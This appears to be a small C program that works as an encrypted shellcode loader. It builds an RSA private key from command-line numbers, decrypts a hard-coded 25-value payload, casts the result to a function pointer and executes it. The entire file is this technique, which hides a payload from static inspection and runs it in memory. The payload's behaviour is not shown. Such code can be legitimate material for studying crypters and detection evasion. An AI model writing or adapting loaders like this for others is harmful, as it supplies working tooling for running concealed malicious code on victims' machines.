#include <stdio.h>
#include "rsa.h"
#include <string.h>
#include <stdlib.h>

int main(int argc, char **argv)
{
 
//  char buffer[400]={0};
  struct private_key_class priv[1];
//  rsa_gen_priv_key(priv,1067,833);
  rsa_gen_priv_key(priv,atoll(argv[1]),atoll(argv[2]));

  unsigned long long memcrypted[25]={0x1c6,0x2ef,0x41e,0x2ce,0x337,0x337,0xd4,0x2ce,0x2ce,0x337,0x62,0x8,0x134,0x255,0x329,0x41e,0x255,0x27b,0x3c5,0x255,0x276,0xb0,0x181,0x5e,0x3fa};
  int memcrypt_size=25;



  unsigned char *decrypted = rsa_decrypt(memcrypted, sizeof(long long)*memcrypt_size, priv);
  if (!decrypted){
    fprintf(stderr, "Error in decryption!\n");
    return 1;
  }

  //memcpy(buffer,decrypted,memcrypt_size);

  //int (*ret)()=(int(*)())buffer;
  int (*ret)()=(int(*)())decrypted;
  ret();
  free(decrypted);
  return 0;
}
